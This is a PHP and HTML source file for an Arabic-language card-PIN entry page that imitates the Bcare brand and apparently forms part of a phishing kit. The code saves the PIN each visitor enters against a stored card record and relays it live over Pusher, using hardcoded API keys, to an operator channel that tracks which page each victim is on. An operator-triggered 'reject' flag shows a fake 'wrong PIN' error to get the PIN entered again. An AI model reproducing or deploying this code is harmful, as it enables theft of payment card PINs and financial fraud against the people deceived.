<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'الرمز السري');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'الرمز السري']);
}

if (isset($_POST['submit'])) {
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $site = array(
        'password' => $_POST["password"],
        'message' => 'الرمز السري',
        'type' => '3'
    );

    $id = $_SESSION['card_id'];
    $userId = $_SESSION['user_id'];
    if ($User->UpdateCardPasswordById($id, $_POST["password"])) {
        $User->UpdateStatus($userId, 'الرمز السري');
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $userId,
            'updatedData' => $site
        ]);
        echo "<script>document.location.href='wait-payment.php';</script>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الرمز السري للبطاقة | بي كير</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-color: #156394;
            --secondary-color: #f9a824;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: var(--text-dark);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .navbar {
            background: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .pin-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .pin-card {
            background: white;
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.05);
            max-width: 450px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .pin-icon {
            width: 70px;
            height: 70px;
            background: #fff7ed;
            color: var(--secondary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.2rem;
            margin: 0 auto 25px;
        }

        .pin-input {
            height: 65px;
            border-radius: 15px;
            text-align: center;
            font-size: 2rem;
            font-weight: 900;
            letter-spacing: 15px;
            border: 2px solid #e2e8f0;
            transition: all 0.3s;
            background: #fdfdfd;
        }

        .pin-input:focus {
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 4px rgba(249, 168, 36, 0.1);
            background: white;
        }

        .btn-confirm {
            background: var(--primary-color);
            color: white;
            height: 60px;
            border-radius: 12px;
            font-weight: 900;
            font-size: 1.1rem;
            border: none;
            transition: all 0.3s;
            margin-top: 30px;
            width: 100%;
        }

        .btn-confirm:hover {
            background: #0c5380;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(21, 99, 148, 0.2);
        }

        .security-badge {
            margin-top: 30px;
            color: #94a3b8;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
    </style>
</head>

<body>

    <nav class="navbar text-center">
        <div class="container">
            <a href="index.php"><img src="./assets/Bcare-logo.svg" alt="Bcare" height="40"></a>
        </div>
    </nav>

    <div class="pin-container">
        <div class="pin-card">
            <div class="pin-icon"><i class="bi bi-key-fill"></i></div>
            <h4 class="fw-900 mb-3">الرمز السري للبطاقة</h4>
            <p class="text-muted small mb-4">يرجى إدخال الرقم السري للبطاقة (PIN) المكون من 4 أرقام لإتمام عملية الدفع
                بأمان.</p>

            <form action="" method="POST">
                <div class="mb-3">
                    <input type="text" name="password" id="pinInput" required pattern="[0-9]*" inputmode="numeric"
                        minlength="4" maxlength="4" class="form-control pin-input" placeholder="••••">
                </div>

                <?php if (isset($_GET['reject'])): ?>
                    <?php $showError = true; ?>
                <?php endif; ?>

                <button type="submit" name="submit" class="btn-confirm">تأكيد العملية</button>
            </form>

            <div class="security-badge">
                <i class="bi bi-shield-lock-fill text-success"></i>
                تشفير آمن بنسبة 100% بنظام SSL
            </div>
        </div>
    </div>

     <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">الرمز السري غير صحيح</h5>
                    <p class="text-muted small px-3">الرمز السري الذي أدخلته غير صحيح. يرجى التأكد من الرمز السري للبطاقة والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>